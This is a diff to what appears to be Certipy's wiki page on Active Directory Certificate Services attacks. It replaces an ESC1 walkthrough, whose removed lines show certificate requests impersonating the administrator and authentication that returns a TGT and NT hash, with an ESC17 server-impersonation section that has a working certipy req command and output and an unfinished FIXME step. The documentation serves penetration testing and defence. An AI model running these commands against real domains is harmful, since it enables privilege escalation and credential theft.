@@ -3117,18 +3117,15 @@ Misconfigurations in AD CS can allow a low-privileged user to escalate privilege
 
    Depending on the assignment, many other potential targets are possible. Essentially, an attacker needs to identify both promising domain accounts they would like to compromise and (TLS-protected) servers where they log into using their domain credentials.
 
-2. **Exploitation with Certipy**
+3. **Exploitation**
 
-    Exploiting an ESC1 vulnerability typically involves two main steps:
+    Exploiting an ESC17 vulnerability typically involves two main steps:
 
-    1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target.
-    2. Using the obtained certificate to authenticate as the target.
+    1. Requesting a certificate using the vulnerable template, injecting the identity of a server to be impersonated.
+    2. Using the obtained certificate to impersonate the server and attack the actual target.
 
-    * **Step 1: Request the certificate for the target user.**
-        The attacker (`attacker@corp.local`) uses `certipy req` to request a certificate. They specify the vulnerable template (`VulnTemplate`) and provide the UPN and SID of the desired target account (e.g., `administrator@corp.local`).
-
-        > 💡 **Tip**: To find the SID and other attributes of a target user like 'administrator', you can use the command:
-        > `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`
+    * **Step 1: Request the certificate for the server to be impersonated.**
+        The attacker (`attacker@corp.local`) uses `certipy req` to request a certificate. They specify the vulnerable template (`VulnTemplate`) and provide the FQDN of the desired victim server (e.g., `wsus.corp.local`).
 
         The command to request the certificate:
 
@@ -3137,65 +3134,40 @@ Misconfigurations in AD CS can allow a low-privileged user to escalate privilege
             -u 'attacker@corp.local' -p 'Passw0rd!' \
             -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
             -ca 'CORP-CA' -template 'VulnTemplate' \
-            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+            -dns 'wsus.corp.local'
         ```
 
         * `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user performing the request.
         * `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
         * `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
-        * `-template 'VulnTemplate'`: The ESC1 vulnerable template.
-        * `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN.
-        * `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.
-
+        * `-template 'VulnTemplate'`: The ESC17 vulnerable template.
+        * `-dns 'wsus.corp.local'`: The FQDN of the victim server to be embedded in the certificate's SAN.
+    
         **Expected Output Snippet:**
 
         ```text
-        Certipy v5.0.0 - by Oliver Lyak (ly4k)
+        Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
         [*] Requesting certificate via RPC
         [*] Request ID is 1
         [*] Successfully requested certificate
-        [*] Got certificate with UPN 'administrator@corp.local'
-        [*] Certificate object SID is 'S-1-5-21-...-500'
-        [*] Saving certificate and private key to 'administrator.pfx'
-        [*] Wrote certificate and private key to 'administrator.pfx'
+        [*] Got certificate with DNS Host Name 'wsus.corp.local'
+        [*] Certificate has no object SID
+        [*] Try using -sid to set the object SID or see the wiki for more details
+        [*] Saving certificate and private key to 'wsus.pfx'
+        [*] Wrote certificate and private key to 'wsus.pfx'
         ```
 
-        The output confirms that a certificate was issued. `Got certificate with UPN 'administrator@corp.local'` and `Certificate object SID is 'S-1-5-21-...-500'` show that the CA included the attacker-supplied identity information in the certificate. The certificate and its corresponding private key are saved to `administrator.pfx`.
+        The output confirms that a certificate was issued. `Got certificate with DNS Host Name 'wsus.corp.local'` shows that the CA included the attacker-supplied identity information in the certificate. The certificate and its corresponding private key are saved to `wsus.pfx`.
 
-    * **Step 2: Authenticate using the obtained certificate.**
-        The attacker now uses the generated `administrator.pfx` file with `certipy auth` to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.
+    * **Step 2: Impersonate the victim server.**
+        FIXME to be discussed -- How much should we go into detail? Typically, this wiki page doesn't link to external resources but describing everything:
 
-        ```bash
-        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
-        ```
+      * is redundant (already done in other tooling/blog posts),
+      * has nothing to do with Certipy
+      * and might blow up should the community decide to look into this and add more exploitation examples.
 
-        * `-pfx 'administrator.pfx'`: The PFX file containing the impersonation certificate and private key.
-        * `-dc-ip '10.0.0.100'`: The IP address of a Domain Controller to authenticate against.
-
-        **Expected Output Snippet:**
-
-        ```text
-        Certipy v5.0.0 - by Oliver Lyak (ly4k)
-
-        [*] Certificate identities:
-        [*]     SAN UPN: 'administrator@corp.local'
-        [*]     SAN URL SID: 'S-1-5-21-...-500'
-        [*]     Security Extension SID: 'S-1-5-21-...-500'
-        [*] Using principal: 'administrator@corp.local'
-        [*] Trying to get TGT...
-        [*] Got TGT
-        [*] Saving credential cache to 'administrator.ccache'
-        [*] Wrote credential cache to 'administrator.ccache'
-        [*] Trying to retrieve NT hash for 'administrator'
-        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
-        ```
-
-        Successful authentication results in a Kerberos TGT for the `administrator` account (saved to `administrator.ccache`), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as `administrator` within the domain.
-
-    *Note on targeting machine accounts:* If the goal is to impersonate a machine account (e.g., a Domain Controller like `DC01$`), the `-dns` parameter should be used with the FQDN of the machine (e.g., `-dns 'dc01.corp.local'`) instead of `-upn`. This correctly populates the dNSName field in the SAN, which is typically used for machine identity. The `-sid` parameter remains the same, specifying the machine account's SID. While using `-upn` with a machine account's UPN (e.g., `DC01$@corp.local`) might sometimes work, `-dns` is the more appropriate SAN type for machine identities.
-
-3. **Mitigations**
+4. **Mitigations**
 
     To prevent ESC1 vulnerabilities, implement the following security measures on your certificate templates:
 
